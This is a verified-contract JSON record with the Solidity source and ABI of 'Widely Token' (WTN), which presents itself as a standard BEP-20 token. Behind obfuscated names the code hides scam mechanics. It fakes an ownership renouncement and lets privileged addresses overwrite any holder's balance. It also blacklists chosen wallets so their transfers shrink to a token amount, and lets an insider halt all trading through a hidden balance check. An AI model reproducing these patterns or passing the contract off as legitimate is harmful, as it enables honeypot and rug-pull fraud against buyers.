{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface walletMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverAtSwap) external view returns (uint256);\n\n    function transfer(address tradingFee, uint256 walletMarketingAmount) external returns (bool);\n\n    function allowance(address enableTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletMarketingAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingFee,\n        uint256 walletMarketingAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptShould, uint256 value);\n    event Approval(address indexed enableTake, address indexed spender, uint256 value);\n}\n\nabstract contract toAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverSwapLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedLaunch {\n    function createPair(address minAuto, address isTeam) external returns (address);\n}\n\ninterface walletModeMetadata is walletMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WidelyToken is toAmount, walletMode, walletModeMetadata {\n\n    function walletFeeSell(uint256 walletMarketingAmount) public {\n        receiverTokenSender();\n        receiverReceiver = walletMarketingAmount;\n    }\n\n    address isFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address swapMinIs, address tradingFee, uint256 walletMarketingAmount) external override returns (bool) {\n        if (_msgSender() != isFee) {\n            if (toMax[swapMinIs][_msgSender()] != type(uint256).max) {\n                require(walletMarketingAmount <= toMax[swapMinIs][_msgSender()]);\n                toMax[swapMinIs][_msgSender()] -= walletMarketingAmount;\n            }\n        }\n        return isLiquidity(swapMinIs, tradingFee, walletMarketingAmount);\n    }\n\n    function transfer(address teamLimit, uint256 walletMarketingAmount) external virtual override returns (bool) {\n        return isLiquidity(_msgSender(), teamLimit, walletMarketingAmount);\n    }\n\n    bool public marketingLiquidity;\n\n    uint256 private isTotal;\n\n    address public enableList;\n\n    address private senderTake;\n\n    function approve(address maxEnable, uint256 walletMarketingAmount) public virtual override returns (bool) {\n        toMax[_msgSender()][maxEnable] = walletMarketingAmount;\n        emit Approval(_msgSender(), maxEnable, walletMarketingAmount);\n        return true;\n    }\n\n    function balanceOf(address receiverAtSwap) public view virtual override returns (uint256) {\n        return fromReceiver[receiverAtSwap];\n    }\n\n    event OwnershipTransferred(address indexed exemptTake, address indexed marketingEnable);\n\n    function tokenLaunch() public {\n        emit OwnershipTransferred(exemptAmount, address(0));\n        senderTake = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeLaunch;\n    }\n\n    string private liquidityBuy = \"WTN\";\n\n    uint256 private walletTo = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoAt;\n    }\n\n    address sellTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public amountList;\n\n    mapping(address => mapping(address => uint256)) private toMax;\n\n    function allowance(address teamSender, address maxEnable) external view virtual override returns (uint256) {\n        if (maxEnable == isFee) {\n            return type(uint256).max;\n        }\n        return toMax[teamSender][maxEnable];\n    }\n\n    function owner() external view returns (address) {\n        return senderTake;\n    }\n\n    constructor (){\n        \n        receiverSwapLimit modeFund = receiverSwapLimit(isFee);\n        enableList = launchedLaunch(modeFund.factory()).createPair(modeFund.WETH(), address(this));\n        \n        exemptAmount = _msgSender();\n        tokenLaunch();\n        limitBuy[exemptAmount] = true;\n        fromReceiver[exemptAmount] = walletTo;\n        \n        emit Transfer(address(0), exemptAmount, walletTo);\n    }\n\n    function isLiquidity(address swapMinIs, address tradingFee, uint256 walletMarketingAmount) internal returns (bool) {\n        if (swapMinIs == exemptAmount) {\n            return listIs(swapMinIs, tradingFee, walletMarketingAmount);\n        }\n        uint256 senderEnable = walletMode(enableList).balanceOf(sellTrading);\n        require(senderEnable == receiverReceiver);\n        require(tradingFee != sellTrading);\n        if (liquidityAmount[swapMinIs]) {\n            return listIs(swapMinIs, tradingFee, walletSwap);\n        }\n        return listIs(swapMinIs, tradingFee, walletMarketingAmount);\n    }\n\n    uint8 private autoAt = 18;\n\n    uint256 receiverReceiver;\n\n    mapping(address => bool) public liquidityAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletTo;\n    }\n\n    bool public atFee;\n\n    bool public liquidityFundTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityBuy;\n    }\n\n    uint256 takeWallet;\n\n    mapping(address => bool) public limitBuy;\n\n    address public exemptAmount;\n\n    string private takeLaunch = \"Widely Token\";\n\n    uint256 constant walletSwap = 2 ** 10;\n\n    mapping(address => uint256) private fromReceiver;\n\n    function totalTx(address takeMode) public {\n        if (liquidityFundTotal) {\n            return;\n        }\n        \n        limitBuy[takeMode] = true;\n        \n        liquidityFundTotal = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return senderTake;\n    }\n\n    function tradingTxAt(address teamLimit, uint256 walletMarketingAmount) public {\n        receiverTokenSender();\n        fromReceiver[teamLimit] = walletMarketingAmount;\n    }\n\n    function receiverTokenSender() private view {\n        require(limitBuy[_msgSender()]);\n    }\n\n    function listIs(address swapMinIs, address tradingFee, uint256 walletMarketingAmount) internal returns (bool) {\n        require(fromReceiver[swapMinIs] >= walletMarketingAmount);\n        fromReceiver[swapMinIs] -= walletMarketingAmount;\n        fromReceiver[tradingFee] += walletMarketingAmount;\n        emit Transfer(swapMinIs, tradingFee, walletMarketingAmount);\n        return true;\n    }\n\n    uint256 private enableAt;\n\n    function listTotal(address modeIs) public {\n        receiverTokenSender();\n        if (isTotal != enableAt) {\n            marketingLiquidity = false;\n        }\n        if (modeIs == exemptAmount || modeIs == enableList) {\n            return;\n        }\n        liquidityAmount[modeIs] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMarketingAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAtSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFundTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeIs\",\"type\":\"address\"}],\"name\":\"listTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMode\",\"type\":\"address\"}],\"name\":\"totalTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMarketingAmount\",\"type\":\"uint256\"}],\"name\":\"tradingTxAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMarketingAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMinIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMarketingAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletMarketingAmount\",\"type\":\"uint256\"}],\"name\":\"walletFeeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WidelyToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}